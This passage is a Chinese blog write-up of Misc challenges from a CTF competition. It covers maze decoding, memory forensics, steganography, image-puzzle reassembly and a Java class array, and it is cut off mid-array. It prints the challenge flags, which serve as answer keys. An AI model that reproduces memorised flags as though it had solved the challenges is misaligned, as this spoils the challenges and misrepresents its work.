<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
<script>
(function(){
    if(''){
        if (prompt('请输入文章密码') !== ''){
            alert('密码错误！');
            history.back();
        }
    }
})();
</script>
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/aixin.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/aixin.png">
  <link rel="mask-icon" href="/images/aixin.png" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
  <script src="true"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideLeftIn"}},"path":"search.xml"};
  </script>



<script>
(function(){
var src = "https://s.ssl.qhres2.com/ssl/ab77b6ea7f3fbf79.js";
document.write('<script src="' + src + '" id="sozz"><\/script>');
})();
</script>




<!-- title、keywords、desc关键字 -->

  <title>留言板</title>
  <meta name="title" content="留言板" />






  <meta name="description" content="长安“战疫”网络安全卫士守护赛wp">
<meta property="og:type" content="article">
<meta property="og:title" content="长安“战疫”网络安全卫士守护赛wp">
<meta property="og:url" content="https://hzy2003628.top/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/index.html">
<meta property="og:site_name" content="风尘孤狼">
<meta property="og:description" content="长安“战疫”网络安全卫士守护赛wp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/8825175c573bcf2bb2cfa5996483d7e0.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f68bcaa5cb798736f81fa0f14bfc2541.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/fca20ff3fb0571b035c77287c52ea550.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/86143164837456a9398bcc63fc2cc168.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1f7efd82018687f9338bf00b6fe86c76.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/fa4725c55a4a30121f2d3f40e0c9ba03.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/85b509813a8594ab11516a7e62a893f3.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/75b4fec6a65dff4e1d833ebcade21519.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/7e2bf3fbf28c6aed2343f3277d07dd1c.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/3c397462c47f1d99e6689ff99a1fe757.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/61b5c5ec848727867bb12318c29fc11f.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/e1c15d97e7f7a97bff0ba6dd56fe7e22.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/19beb4a90516b84a93312734ae062940.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a9a8b3ed2d5f6b0438281fac31a1825a.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/24f8b6ee51942458e1ca88febe9090ad.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/492606868e4c5b7ee1240c16d49da4cb.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c9973d8e816565f1e25b5cadaaf66d18.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/0b9dbb77b5c6abda4d809cd759a948eb.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/6b5b32e9cbfc17a1386281281041897b.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/129136b313320b1da7499de255d81832.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5e1aa323a66df182405f00d7599cdd92.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/ae7a40536e23ee7973c69e279960cef7.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/723a664982706e4eb3f98e5b1b33192b.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/7a550f751b0424e53280b3976be4cdf7.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/bf88a237bdc35899db9ffb34c2c18d04.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/9fdf2034e8c6864b35616401982f53ec.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5146359cd1f86ddf4d5dbd6f2c9d8b1a.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c9801d185e8c4c2cffc019efff18c473.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/8091f4f3ec63390e6622b3aba55baf4e.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/cf6510bae78f50b6ac5c90f25444c0a7.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/75e187221d88fa32723525ed32f18090.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/3a7ba0bb6709a77fb33cb50426c820ec.webp?x-oss-process=image/format,png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/501648abb30189f7c023ce63ab1c964e.webp?x-oss-process=image/format,png">
<meta property="article:published_time" content="2022-01-08T06:12:16.000Z">
<meta property="article:modified_time" content="2022-07-07T10:22:28.980Z">
<meta property="article:author" content="故里">
<meta property="article:tag" content="赛后复盘">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/8825175c573bcf2bb2cfa5996483d7e0.png">

<link rel="canonical" href="https://hzy2003628.top/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>长安“战疫”网络安全卫士守护赛wp | 风尘孤狼</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?d1ea9671a278a2cb33e24c76d08af22f";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">风尘孤狼</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">知识型学习记录</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">43</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">19</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">90</span></a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
        <li class="menu-item menu-item-love">

    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>




    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="故里">
      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="风尘孤狼">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          长安“战疫”网络安全卫士守护赛wp
        </h1>

        <div class="post-meta">  
		 
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-08 14:12:16" itemprop="dateCreated datePublished" datetime="2022-01-08T14:12:16+08:00">2022-01-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-07 18:22:28" itemprop="dateModified" datetime="2022-07-07T18:22:28+08:00">2022-07-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">赛后复盘</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span id="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/" class="post-meta-item leancloud_visitors" data-flag-title="长安“战疫”网络安全卫士守护赛wp" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>26k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>24 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>长安“战疫”网络安全卫士守护赛wp</p>
<span id="more"></span>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8825175c573bcf2bb2cfa5996483d7e0.png" alt=" "></p>
<h1 id="misc">Misc</h1>
<h3 id="八卦迷宫">【八卦迷宫】</h3>
<p>按照迷宫走然后取字的拼音即可</p>
<pre><code class="hljs plaintext">cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</code></pre>
<h3 id="朴实无华的取证">【朴实无华的取证】</h3>
<p>首先查看版本 imageinfo得到WinXPSP2x86</p>
<p>然后pslist，注意到<img src="https://img-blog.csdnimg.cn/img_convert/f68bcaa5cb798736f81fa0f14bfc2541.png" alt="img"></p>
<p>然后</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fca20ff3fb0571b035c77287c52ea550.png" alt="img"></p>
<p>发现目录是桌面而并非Desktop，重新filescan一下，导出有用信息<img src="https://img-blog.csdnimg.cn/img_convert/86143164837456a9398bcc63fc2cc168.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-r6LzEg9C-1641631822278)(mumuzi.assets/image-20220108103543050.png)]"></p>
<p>首先zip的密码是上面说的20211209</p>
<p>其次，得到的txt是加密函数，而密文在flag.png上。反过来写一个脚本：</p>
<pre><code class="hljs plaintext">s = &#x27;fdcb[8ldq?zloo?fhuwdlqob?vxffhhg?lq?iljkwlqj?wkh?hslghplf]&#x27;
for i in s:
    if(ord(i)&gt;=ord(&#x27;a&#x27;) and ord(i)&lt;=ord(&#x27;w&#x27;)):
        print(chr(ord(i)-3),end=&#x27;&#x27;)
    elif(i == &#x27;a&#x27;):
        print(&#x27;x&#x27;,end=&#x27;&#x27;)
    elif(i == &#x27;b&#x27;):
        print(&#x27;y&#x27;,end=&#x27;&#x27;)
    elif(i == &#x27;c&#x27;):
        print(&#x27;z&#x27;,end=&#x27;&#x27;)
    elif(i == &quot;|&quot;):
        print(&#x27;_&#x27;)
    else:
        print(chr(ord(i)+32),end=&#x27;&#x27;)
 #ca`_&#123;Xian_šill_certainl__s˜cceed_in_fighting_the_epidemic&#125;
</code></pre>
<p>查了一下certainl后面应该还有个y</p>
<p>然后前面那个单词是will，后面那个单词是succeed，于是得到flag提交正确</p>
<pre><code class="hljs plaintext">cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</code></pre>
<h3 id="无字天书">【无字天书】</h3>
<p>导出HTTP流，在导出的其中两个文件发现hex串，都是很明显的zip，hex–&gt;ascii，得到zip，打开zip得到两文件，一个key.ws一个flag.txt</p>
<p>ws很明显的whitespace，直接https://vii5ard.github.io/whitespace/得到key:XiAnWillBeSafe</p>
<p>然后flag.txt很明显的SNOW</p>
<p>.\SNOW.EXE -p XiAnWillBeSafe -C .\flag.txt</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1f7efd82018687f9338bf00b6fe86c76.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5EINTl6Z-1641631822281)(mumuzi.assets/image-20220108104800137.png)]"></p>
<pre><code class="hljs plaintext">cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</code></pre>
<h3 id="西安加油">【西安加油】</h3>
<p>这道题我看了很久，在比赛中还是没有写出来。</p>
<p>查看流量包发现大量的base64串，导出http发现secret.txt，base64解码发现是zip，保存后打开发现是拼图</p>
<p>因为不知道大小，所以猜了一个12*4</p>
<p>命令montage *png -tile 12x4 -geometry 100x100+0+0 out2.png</p>
<p>然后用gaps</p>
<p>python3 gaps --image=out2.png --generations=10 --population=48 --size=100 --save</p>
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-68Bjlf7Q-1648815391417)(<a target="_blank" rel="noopener" href="https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220313182357.png">https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220313182357.png</a>)]</p>
<pre><code class="hljs plaintext">cazy&#123;make_XiAN_great_Again&#125;</code></pre>
<h3 id="binary">【binary】</h3>
<p>文件头能看出来是class文件，直接扔jadx</p>
<p>数组转出来</p>
<pre><code class="hljs plaintext">s = [77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 